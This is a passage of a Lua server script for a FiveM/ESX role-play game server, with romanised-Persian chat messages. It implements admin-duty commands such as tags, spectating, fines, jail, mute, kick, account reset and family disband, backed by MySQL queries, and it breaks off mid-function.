ESX                = nil
AdminPlayers = {}
tempOown = false

local resetaccountAceess = {

	'steam:11000011c2dd69c'

}

local disbandfamilyAceess = {

	'steam:11000011c2dd69c'

}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

AddEventHandler('playerDropped', function()

	local _source = source

	if _source ~= nil then

		local identifier = GetPlayerIdentifier(_source)
		if AdminPlayers[identifier] ~= nil then
			AdminPlayers[identifier] = nil
			TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)
			TriggerEvent('DiscordBot:ToDiscord', 'duty', GetPlayerName(_source), 'OffDuty shod','user', true, _source, false)
		end

	end

end)

AddEventHandler('esx:playerLoaded', function(source)

	TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)

end)

RegisterServerEvent("aduty:statusHandler")
AddEventHandler("aduty:statusHandler", function(status)

	tempOown = status

end)

RegisterServerEvent("aduty:changeDutyStatus")
AddEventHandler("aduty:changeDutyStatus", function()

	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer then
		xPlayer.set('aduty', false)
	end

end)

RegisterServerEvent("aduty:playerLoaded")
AddEventHandler("aduty:playerLoaded", function()

	TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)

end)

ESX.RegisterServerCallback('esx_aduty:checkdutystatus', function(source, cb, target)
	CheckPlayerDutyStatus(target, cb)
end)

ESX.RegisterServerCallback('esx_aduty:checkAdmin', function(source, cb)

	local xPlayer = ESX.GetPlayerFromId(source)

		if xPlayer.permission_level > 1 then
			cb(true)
		else
			cb(false)
		end

end)


function CheckPlayerDutyStatus(target, cb)
    local xPlayer = ESX.GetPlayerFromId(target)
	MySQL.Async.fetchAll(
		'SELECT IsOnDuty FROM users WHERE identifier=@identifier',
		{
            ['@identifier'] = xPlayer.identifier,
		}, function(result)
			if result[1].IsOnDuty then
				cb(true)
			else
				cb(false)
			end

		end)
end

RegisterCommand('aduty', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 0 then

				if xPlayer.get('aduty') then

					xPlayer.set('aduty', false)
					AdminPlayers[xPlayer.identifier] = nil
					TriggerClientEvent('aduty:tag', source, false)
					TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)
					TriggerClientEvent("OffDutyHandler", source)
					TriggerClientEvent('esx_basicneeds:healPlayer', source)
					TriggerClientEvent('aduty:removeSuggestions', source)
					TriggerClientEvent('aduty:visibleForce', source)
					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1OffDuty ^0Shodid!")

				else

					if not xPlayer.get('jailed') then

						xPlayer.set('aduty', true)
						AdminPlayers[xPlayer.identifier] = {source = source, permission = xPlayer.permission_level, hide = false}
						TriggerClientEvent('aduty:tag', source, true)
						TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)
						TriggerClientEvent("miladify:resetcharForce", source, false)
						TriggerClientEvent("OnDutyHandler", source, xPlayer.permission_level)
						TriggerClientEvent('esx_basicneeds:healPlayer', source)
						TriggerClientEvent('aduty:addSuggestions', source)
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2OnDuty ^0Shodid!")

					else

						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid hengami ke ^1jail ^0shodid ^2OnDuty ^0konid!")

					end

				end

		else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
	end
end)

RegisterServerEvent("aduty:requestSpectate")
AddEventHandler('aduty:requestSpectate', function(playerId)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.permission_level > 0 then
		TriggerClientEvent("aduty:requestSpectate", source, playerId)
	end
end)

RegisterCommand('atoggle', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 0 then

		if xPlayer.get('aduty') then

			if AdminPlayers[xPlayer.identifier].hide == false then

				AdminPlayers[xPlayer.identifier].hide = true
				TriggerClientEvent('aduty:tagChanger', source, false)
				TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2tag^0 khod ra khamosh kardid")

			else

				AdminPlayers[xPlayer.identifier].hide = false
				TriggerClientEvent('aduty:tagChanger', source, true)
				TriggerClientEvent('aduty:set_tags', -1, AdminPlayers)
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2tag^0 khod ra roshan kardid")

			end

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
		end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
	end

end, false)

RegisterCommand('owntoggle', function(source)

	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 0 then

		if xPlayer.get('aduty') then

			TriggerClientEvent('aduty:returnStatus', source)
			Citizen.Wait(250)
			if tempOown then
				TriggerClientEvent('aduty:tagChanger', source, false)
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2tag^0 khod ra baraye khod khamosh kardid")
			else
				TriggerClientEvent('aduty:tagChanger', source, true)
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2tag^0 khod ra baraye khod roshan kardid")
			end

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
		end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
	end

end, false)

RegisterCommand("changeped", function(source, args, user)

	local xPlayer = ESX.GetPlayerFromId(source)

			if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					if args[1] then

						if args[2] == nil then

							local requestped = tostring(args[1])

							TriggerClientEvent("changepedHandler", source, requestped)

						else

							TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma esm ped ra faghat bayad dar argument aval vared konid")

						end

					else

						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma hich pedi vared nakardid")


					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
			end

end)

RegisterCommand('resetped', function(source)

	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					TriggerClientEvent("resetpedHandler", source, "s_m_m_chemsec_01")
		            TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Ped shoma ba movafaghat reset shod!")

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
	end


end)

RegisterCommand("w", function(source, args)

local xPlayer = ESX.GetPlayerFromId(source)

if xPlayer.permission_level > 1 then
		if args[1] and args[2] then
			if tonumber(args[1]) then
				local target = tonumber(args[1])
				if GetPlayerName(target) then

				local targetPlayer = ESX.GetPlayerFromId(target)
				local message = table.concat(args, " ",2)

					TriggerClientEvent('chatMessage', target, "^0(^1" .. "^1Admin | " .. GetPlayerName(source) .. "^0)" .. " ^3>>", {255, 0, 0}, "^0" .. message)
					TriggerClientEvent('chatMessage', source, "^0(^1" .. GetPlayerName(target) .. "^0)" .. " ^3>>", {255, 0, 0}, "^0" .. message)

				else
					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")
				end

			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")
			end

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")
		end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
	end

end)

RegisterCommand("setarmor", function(source, args)

	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level >= 10 then

				if xPlayer.get('aduty') then

					if args[1] and args[2] then
						if tonumber(args[1]) then

							local target = tonumber(args[1])

							  if tonumber(args[2]) then

									  local armor = tonumber(args[2])

								 if armor <= 100 then

										if GetPlayerName(target) then

										local targetPlayer = ESX.GetPlayerFromId(target)

											TriggerClientEvent('chatMessage', target, "[SYSTEM]", {255, 0, 0}, " ^2" .. GetPlayerName(source) .. " ^0 Armor shomara be ^3" .. armor ..  " ^0Taghir dad!")
											TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "^0 Shoma be ^2 " .. GetPlayerName(target) .. "^3 " .. armor .. " ^0Armor dadid!")
											TriggerClientEvent('armorHandler', target, armor)

										else
											TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")
										end
								else
									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid meghdar armor ra bishtar az 100 vared konid!")
								end

								else
									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat Armor faghat mitavanid adad vared konid!")
								end

						else
							TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")
						end

					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")
					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

		else
			if xPlayer.permission_level > 1 then
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dastresi kafi baraye estefade az in dastor nadarid!")
			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")
			end
		end

	end)

	RegisterCommand('fineoffline', function(source, args, users)
		local xPlayer = ESX.GetPlayerFromId(source)
		if xPlayer.permission_level > 1 then

					if xPlayer.get('aduty') then

						if args[1] and args[2] and args[3] then

							local OnlinePlayers = ESX.GetPlayers()
							local run = true

									for i=1, #OnlinePlayers, 1 do

										local xPlayers = ESX.GetPlayerFromId(OnlinePlayers[i])

										if xPlayers.name == args[1] then

											run = false

										end

									end

							if run then
									local money = tonumber(args[2])
									if money then

										MySQL.Async.fetchAll('SELECT * FROM users WHERE playerName = @playername',
										{
											['@playername'] = args[1]

										}, function(data)
											if data[1] then

												if #data > 1 then

													TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Bish az yek player ba in naam vojoud darad!")

													for i=1, #data, 1 do

														TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0player haye mojoud:" .. data[i].playerName )

													end

												else

													local playerMoney = data[1].bank

													if playerMoney >= money then

																MySQL.Async.execute('UPDATE users SET bank = bank - @money WHERE identifier=@identifier',
																{
																	['@identifier'] = data[1].identifier,
																	["@money"] = money

																}, function(rowsChanged)
																	if rowsChanged > 0 then

																		local previousmoney = playerMoney
																		local currentmoney = playerMoney - money

																		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma az^1 " .. args[1] .. " ^0Mablagh ^2" .. money .. "$ ^0kam kardid!" )
																		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Pool ghadimi ^3" .. args[1] .. " ^1" .. previousmoney .. "$^0 Pool jadid ^2" .. currentmoney .. "$" )

																		local reason = table.concat(args, " ",3)
																		TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^6" .. args[1] .. " ^2" .. money .. "$ ^0 Jarime shod be elat ^3^*" .. reason )


																		MySQL.Async.execute('INSERT INTO fines (identifier, name, fineamount, reason, punisher) VALUES (@identifier, @name, @fineamount, @reason, @punisher)',
																		{
																			['@identifier'] = data[1].identifier,
																			['@name'] = args[1],
																			['@fineamount'] = money,
																			['@reason'] = reason,
																			['@punisher']= GetPlayerName(source)
																		})

																	end
																end)

														else

															TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Pool player mored nazar baraye in meghdar az jarime kafi nist!")
															TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Poole ^1" .. args[1] .. " ^2" .. playerMoney .. "$ ^0ast!" )
													end


												end

											else
												TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar vojoud nadarad!")
											end
										end)


									else
										TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat fine faghat mitavanid adad vared konid!")
									end

								else
									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online ast!")
								end

							else
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")
							end

					else

						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

					end

		else
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma admin nistid!")
		end
end)

RegisterCommand('ajailoffline', function(source, args, users)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					if args[1] and args[2] and args[3] then

                        local OnlinePlayers = ESX.GetPlayers()
                        local run = true

                                for i=1, #OnlinePlayers, 1 do

                                    local xPlayers = ESX.GetPlayerFromId(OnlinePlayers[i])

                                    if xPlayers.name == args[1] then

                                        run = false

                                    end

                                end

                        if run then

                            if tonumber(args[2]) then
                                local jailTime = tonumber(args[2])


                            MySQL.Async.fetchAll('SELECT * FROM users WHERE playerName = @playername',
                                        {
                                            ['@playername'] = args[1]

                                        }, function(data)
                                            if data[1] then

                                                if #data > 1 then

                                                    TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Bish az yek player ba in naam vojoud darad!")

                                                    for i=1, #data, 1 do

                                                        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0player haye mojoud:" .. data[i].playerName )

                                                    end

                                                else


                                                                MySQL.Async.execute('UPDATE users SET jail = @jailtime WHERE identifier=@identifier',
                                                                {
                                                                    ['@identifier'] = data[1].identifier,
                                                                    ["@jailtime"] = jailTime

                                                                }, function(rowsChanged)
                                                                    if rowsChanged > 0 then


                                                                            local jailReason = table.concat(args, " ",3)


                                                                                if jailTime ~= nil then


                                                                                        MySQL.Async.execute('INSERT INTO adminjaillog (identifier, name, jailreason, jailtime, punisher) VALUES (@identifier, @name, @reason, @jailtime, @punisher)',
                                                                                                {
                                                                                                    ['@identifier'] = data[1].identifier,
                                                                                                    ['@name'] = args[1],
                                                                                                    ['@jailtime'] = jailTime,
                                                                                                    ['@reason'] = jailReason,
                                                                                                    ['@punisher']= GetPlayerName(source)
                                                                                                })

																								TriggerClientEvent('chatMessage', -1, "[AdminJail]", {255, 0, 0}, " ^1" .. args[1] .. "^0 Admin jail shod be Dalile:^2 " .. jailReason .. "^0 Be modat ^3" .. jailTime .. " ^0Daghighe")
																								TriggerEvent('DiscordBot:ToDiscord', 'ajail', 'Jail Log', data[1].name .. ' tavasot ' .. GetPlayerName(source) .. ' jail shod be modat ' .. jailTime .. ' daghighe be dalil: ' .. jailReason,'user', true, source, false)


                                                                                    TriggerClientEvent("esx:showNotification", source, args[1] .. " Zendani shod baraye ~r~~h~" .. args[2] .. " ~w~Daghighe!")

                                                                                else
                                                                                    TriggerClientEvent("esx:showNotification", source, "Zaman na motabar ast!")
                                                                                end

                                                                    end
                                                                end)

                                                end

                                            else
                                                TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar vojoud nadarad!")
                                            end
                                        end)

                                    else
                                        TriggerClientEvent('chatMessage', src, "[SYSTEM]", {255, 0, 0}, "Shoma dar ghesmat Zaman faghat mitavanid adad vared konid.")
                                    end

                            else
                                TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online ast!")
                            end

                        else
                            TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")
                        end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma admin nistid!")
	end
end)

RegisterCommand('plate', function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					if args[1] then
						local licenseplate = table.concat(args, " ")
						TriggerClientEvent("aduty:vehiclelicenseHandler", source, licenseplate)
					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma hich pelaki vared nakardid!")
					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

        else
        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma admin nistid!")
    end
end)

RegisterCommand('a', function(source, args)

    local xPlayer = ESX.GetPlayerFromId(source)

    if xPlayer.permission_level > 1 then
        if args[1] then

                        local name = GetPlayerName(source)
                        local message = table.concat(args, " ")


                            local xPlayers = ESX.GetPlayers()

                            for i=1, #xPlayers, 1 do

                                local xP = ESX.GetPlayerFromId(xPlayers[i])

                                if xP.permission_level > 0 then

                                    TriggerClientEvent('chatMessage', xPlayers[i], "", {255, 0, 0}, "^4[^1AdminChat^4] ^3" .. name .. "^0: " .. "^0^*" .. message .. "^4")

                                end

                            end


                    else
                        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid matn khali befrestid!")
                    end

    else
        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma admin nistid!")
    end

end)

RegisterCommand('kick', function(source, args, user)

    local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 0 then

		if args[1] and args[2] then

			target = tonumber(args[1])

				if target then

					local name = GetPlayerName(target)
					if name then

                        targetPlayer = ESX.GetPlayerFromId(target)
						local message = table.concat(args, " ", 2)
						targetPlayer.kick(GetPlayerName(source) .. " Shomara kick kard be dalil: " .. message)
						TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. name .. " ^0tavasot ^2" .. GetPlayerName(source) .. " ^0kick shod dalil ^3" .. message)

					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")
					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")

				end


			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Syntax vared shode eshtebah ast!")

		end

    else
        TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma admin nistid!")
	end

end)

RegisterCommand('mute', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					if args[1] then
							local target = tonumber(args[1])
						if args[2] then
							local reason = table.concat(args, " ", 2)

								if target then

									if GetPlayerName(target) then

										if GetPlayerName(source) ~= GetPlayerName(target) then

											TriggerClientEvent('chat:setMuteStatus', target, true)
											TriggerClientEvent('aduty:setMuteStatus', target, true)
											TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^2" .. GetPlayerName(target) .. "^0 ra ^1mute ^0kardid!")
											TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, "^1" ..  GetPlayerName(target) .. " ^0tavasot ^2" .. GetPlayerName(source) .. "^0 mute shod be dalil: ^3" .. reason)

										else

											TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid khodetan ra mute konid!")

										end

									else

										TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")

									end

								else

									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")

								end

							else
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat Dalil chizi vared nakardid!")
							end


					else

						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID chizi vared nakardid!")

					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

	end

end)

RegisterCommand('unmute', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					if args[1] then
						local target = tonumber(args[1])

							if target then

								if GetPlayerName(target) then


										TriggerClientEvent('chat:setMuteStatus', target, false)
										TriggerClientEvent('aduty:setMuteStatus', target, false)
										TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^3" .. GetPlayerName(target) .. "^0 ra ^2unmute ^0kardid!")
										TriggerClientEvent('chatMessage', target, "[SYSTEM]", {255, 0, 0}, " ^0Shoma tavasot ^2" .. GetPlayerName(source) .. "^0 ^3unmute ^0shodid!")

								else

									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar online nist!")

								end

							else

								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!")

							end

					else

						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat ID chizi vared nakardid!")

					end

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

	end

end)

RegisterCommand("toggleid", function(source)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.permission_level > 1 then

				if xPlayer.get('aduty') then

					TriggerClientEvent('aduty:changeShowStatus', source)

				else

					TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")

				end

	else

		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma ^1Admin ^0nistid!")

	end

end)

RegisterCommand("resetaccount", function(source, args)

		if isAllowedToReset(source) then

			if args[1] then
				if args[2] then
					local name = args[1]
					local reason = table.concat(args, " ", 2)

					MySQL.Async.fetchAll('SELECT * FROM users WHERE playerName = @playername',
					{
						['@playername'] = name

					}, function(data)
						if data[1] then

							if #data > 1 then

								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Bish az yek player ba in naam vojoud darad!")

								for i=1, #data, 1 do

									TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0player haye mojoud:" .. data[i].playerName )

								end

							else

								MySQL.Async.execute('DELETE FROM addon_account_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM addon_inventory_items WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM billing WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM billing WHERE sender = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM datastore_data WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM owned_properties WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM owned_vehicles WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM playersTattoos WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM rented_vehicles WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM user_accounts WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM user_inventory WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM user_licenses WHERE owner = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM user_parkings WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM phone_user_contacts WHERE number IN (SELECT phone_number FROM users WHERE @identifier)', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('DELETE FROM characters WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET bank = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET money = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET job = "unemployed" WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								MySQL.Async.execute('UPDATE users SET job_grade = 0 WHERE identifier = @identifier', { ['@identifier'] = data[1].identifier })
								TriggerEvent('DiscordBot:ToDiscord', 'disband', 'ResetAccount Log', GetPlayerName(source) .. " accounte " .. name .. " ra reset kard be dalil: " .. reason,'user', true, source, false)
								TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Account ^1" .. name .. " ^0ba ^2movafaghiat ^0reset shod, Dalil: " .. reason)
								TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Account ^2" .. name .. " ^0be dalil ^1" .. reason .. " ^0reset shod!")


							end




					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Player mored nazar vojoud nadarad!")
					end
				end)

			else
				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat dalil chizi vared nakardid!")
			end

			else

				TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dar ghesmat esm chizi vared nakardid!")

			end


		else

			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma dastresi kafi baraye esfade az in dastor ra nadarid!")

		end

end, false)

RegisterCommand("disband", function(source, args)

	if isAllowedToDisband(source) then

		if args[1] then
			if args[2] then

				local family = args[1]
				local reason = table.concat(args, " ", 2)

				MySQL.Async.fetchAll('SELECT family_name FROM families_data WHERE family_name = @family',
				{
					['@family'] = family

				}, function(data)
					if data[1] then

						MySQL.Async.execute('DELETE FROM families WHERE name = @family', { ['@family'] = family })
						MySQL.Async.execute('DELETE FROM family_grades WHERE family_name = @family', { ['@family'] = family })
						MySQL.Async.execute('DELETE FROM family_account WHERE name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM addon_inventory_items WHERE inventory_name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM family_account_data WHERE family_name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM datastore_data WHERE name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM datastore WHERE name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM addon_inventory WHERE name = @family', { ['@family'] = "family_" .. string.lower(family) })
						MySQL.Async.execute('DELETE FROM families_data WHERE family_name = @family', { ['@family'] = family })
						MySQL.Async.execute('UPDATE users SET family = "nofamily" WHERE family = @family', { ['@family'] = family })
						TriggerEvent('DiscordBot:ToDiscord', 'disband', 'Disband Log', GetPlayerName(source) .. " familye " .. family .. " ra disband kard be dalil: " .. reason,'user', true, source, false)
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Family ^1" .. family .. " ^0ba ^2movafaghiat ^0disband shod, dalil: " ..  reason)
						TriggerClientEvent('chatMessage', -1, "[SYSTEM]", {255, 0, 0}, " ^0Family ^2" .. family .. " ^0be dalil ^1" .. reason .. " ^0disband shod!")


					else
						TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Family mored nazar vojoud nadarad!")
					end
				end)

			else
